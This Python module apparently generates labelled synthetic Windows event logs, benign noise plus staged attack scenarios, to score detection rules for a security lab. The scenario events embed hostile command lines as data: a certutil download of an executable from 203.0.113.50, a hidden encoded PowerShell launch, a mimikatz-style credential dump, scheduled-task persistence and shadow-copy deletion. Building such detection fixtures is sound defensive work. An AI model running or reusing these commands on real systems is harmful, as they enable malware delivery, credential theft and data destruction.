"""Generate labelled synthetic events: benign noise plus attack scenarios.

Every event carries `_label`: "benign" or the id of the rule that SHOULD fire on it
(or on the group, for threshold rules). evaluate() scores a rule set against that ground truth.
All data is fake. Seeded for reproducibility.
"""
import random
from datetime import datetime, timedelta

BASE = datetime(2026, 3, 1, 9, 0, 0)
HOSTS = ["WS01", "WS02", "WS03", "SRV-FILE", "DC01"]
USERS = ["LAB\\alice", "LAB\\bob", "LAB\\carol", "LAB\\svc_backup"]
SYS = "C:\\Windows\\System32\\"
PS = SYS + "WindowsPowerShell\\v1.0\\powershell.exe"
WORD = "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"


def _t(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%S")


class Sim:
    def __init__(self, seed=7):
        self.rng = random.Random(seed)
        self.events = []
        self.clock = BASE

    def add(self, eid, label="benign", gap=(1, 20), **fields):
        self.clock += timedelta(seconds=self.rng.randint(*gap))
        ev = {"EventID": eid, "UtcTime": _t(self.clock), "_label": label}
        ev.update(fields)
        ev.setdefault("Computer", "WS01")
        ev.setdefault("User", "LAB\\alice")
        self.events.append(ev)

    # ---------- benign noise ----------
    def noise(self, n=150):
        procs = [
            (SYS + "svchost.exe", "svchost.exe -k netsvcs", SYS + "services.exe"),
            ("C:\\Windows\\explorer.exe", "explorer.exe", SYS + "userinit.exe"),
            ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --type=renderer",
             "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
            (WORD, "WINWORD.EXE report.docx", "C:\\Windows\\explorer.exe"),
            (SYS + "ipconfig.exe", "ipconfig /all", SYS + "cmd.exe"),
            (PS, "powershell.exe -File C:\\Scripts\\inventory.ps1", SYS + "svchost.exe"),
        ]
        for _ in range(n):
            kind = self.rng.random()
            host = self.rng.choice(HOSTS)
            user = self.rng.choice(USERS)
            if kind < 0.6:
                img, cl, par = self.rng.choice(procs)
                self.add(1, Computer=host, User=user, Image=img, CommandLine=cl, ParentImage=par)
            elif kind < 0.8:
                self.add(3, Computer=host, User=user, Image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                         DestinationIp="142.250.%d.%d" % (self.rng.randint(0, 255), self.rng.randint(1, 254)),
                         DestinationPort=443)
            elif kind < 0.9:
                self.add(11, Computer=host, User=user, Image=WORD,
                         TargetFilename="C:\\Users\\alice\\Documents\\notes%d.docx" % self.rng.randint(1, 50))
            elif kind < 0.95:
                self.add(22, Computer=host, User=user, Image="C:\\Windows\\explorer.exe",
                         QueryName="www.example%d.com" % self.rng.randint(1, 30))
            else:
                self.add(4624, Computer="DC01", TargetUserName=self.rng.choice(["alice", "bob"]),
                         IpAddress="10.0.0.%d" % self.rng.randint(10, 40), LogonType="3")
        # benign things that look a bit scary: must NOT alert
        self.add(13, Image="C:\\Windows\\System32\\msiexec.exe",
                 TargetObject="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater")
        self.add(10, SourceImage="C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe",
                 TargetImage=SYS + "lsass.exe", GrantedAccess="0x1010")
        self.add(3, Image=PS, DestinationIp="10.0.0.5", DestinationPort=4444)
        self.add(4662, Computer="DC01", SubjectUserName="DC01$", Properties="1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")

    # ---------- attack scenarios ----------
    def phishing_macro_chain(self, host="WS02", user="LAB\\bob"):
        self.add(1, "sl-0001,sl-0002", Computer=host, User=user, Image=PS, ParentImage=WORD,
                 CommandLine="powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=")
        self.add(3, "sl-0009", Computer=host, User=user, Image=PS, DestinationIp="203.0.113.50", DestinationPort=4444)
        self.add(1, "sl-0003", Computer=host, User=user, Image=SYS + "certutil.exe",
                 CommandLine="certutil.exe -urlcache -split -f http://203.0.113.50/a.exe C:\\Users\\Public\\a.exe",
                 ParentImage=PS)

    def persistence(self, host="WS02", user="LAB\\bob"):
        self.add(13, "sl-0011", Computer=host, User=user, Image="C:\\Users\\bob\\AppData\\Local\\Temp\\a.exe",
                 TargetObject="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater")
        self.add(1, "sl-0004", Computer=host, User=user, Image=SYS + "schtasks.exe", ParentImage=SYS + "cmd.exe",
                 CommandLine="schtasks /create /tn Updater /tr C:\\Users\\Public\\a.exe /sc onlogon")
        self.add(11, "sl-0013", Computer=host, User=user, Image="C:\\Users\\Public\\a.exe",
                 TargetFilename="C:\\Users\\bob\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.exe")
        self.add(20, "sl-0012", Computer=host, User=user, Image=SYS + "wbem\\scrcons.exe")

    def credential_access(self, host="WS02", user="LAB\\bob"):
        self.add(10, "sl-0010", Computer=host, User=user, SourceImage="C:\\Users\\Public\\a.exe",
                 TargetImage=SYS + "lsass.exe", GrantedAccess="0x1410")
        self.add(1, "sl-0005", Computer=host, User=user, Image="C:\\Users\\Public\\m.exe", ParentImage=SYS + "cmd.exe",
                 CommandLine="m.exe privilege::debug sekurlsa::logonpasswords exit")
        for i in range(4):
            self.add(4769, "sl-0015", gap=(2, 8), Computer="DC01", IpAddress="10.0.0.22", ServiceName="svc_sql%d" % i,
                     TicketEncryptionType="0x17", TargetUserName="bob")
        for i in range(6):
            self.add(4625, "sl-0016", gap=(2, 10), Computer="DC01", IpAddress="10.0.0.99", TargetUserName="admin%d" % i,
                     LogonType="3")
        self.add(4662, "sl-0017", Computer="DC01", SubjectUserName="bob",
                 Properties="{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}")

    def recon_and_lateral(self, host="WS02", user="LAB\\bob"):
        for idx, cmd in enumerate(["whoami /all", "net user /domain", "nltest /dclist:lab.local", "systeminfo", "net group \"Domain Admins\" /domain"]):
            exe = {"whoami": "whoami.exe", "net": "net.exe", "nltest": "nltest.exe", "systeminfo": "systeminfo.exe"}[cmd.split()[0]]
            self.add(1, "sl-0008" if idx == 3 else "benign", gap=(2, 10),
                     Computer=host, User=user, Image=SYS + exe, CommandLine=cmd, ParentImage=SYS + "cmd.exe")
        self.add(1, "sl-0007", Computer="SRV-FILE", User="LAB\\bob", Image="C:\\Windows\\PSEXESVC.exe",
                 ParentImage=SYS + "services.exe", CommandLine="C:\\Windows\\PSEXESVC.exe")
        self.add(4728, "sl-0018", Computer="DC01", TargetUserName="Domain Admins", MemberName="CN=bob")

    def impact(self, host="SRV-FILE"):
        self.add(1, "sl-0006", Computer=host, User="LAB\\bob", Image=SYS + "vssadmin.exe", ParentImage=SYS + "cmd.exe",
                 CommandLine="vssadmin delete shadows /all /quiet")
        self.add(1102, "sl-0019", Computer=host, User="LAB\\bob", Channel="Security")
        self.add(22, "sl-0014", Computer=host, Image=PS, QueryName="a" * 45 + ".bad.example.net")

    def full(self, noise=150):
        self.noise(noise)
        self.phishing_macro_chain()
        self.noise(60)
        self.persistence()
        self.credential_access()
        self.recon_and_lateral()
        self.impact()
        self.noise(40)
        return self.events


def generate(seed=7, noise=150):
    from .events import normalise
    return [normalise(e) for e in Sim(seed).full(noise)]


def evaluate(rules, events):
    """Score detections against `_label`. Threshold rules are counted once per label hit."""
    from .engine import run
    dets = run(rules, events)
    expected = {}
    for ev in events:
        lab = ev.get("_label", "benign")
        for one in ([] if lab == "benign" else lab.split(",")):
            expected[one] = expected.get(one, 0) + 1
    fired = {}
    false_pos = []
    for d in dets:
        fired.setdefault(d.rule.id, 0)
        fired[d.rule.id] += 1
        lab = d.event.get("_label", "benign")
        if d.rule.id not in lab.split(","):
            false_pos.append(d)
    missed = sorted(r for r in expected if r not in fired)
    return {"rules": len(rules), "expected_rules": len(expected), "fired_rules": len(fired),
            "missed": missed, "false_positives": [d.as_dict() for d in false_pos], "detections": len(dets)}
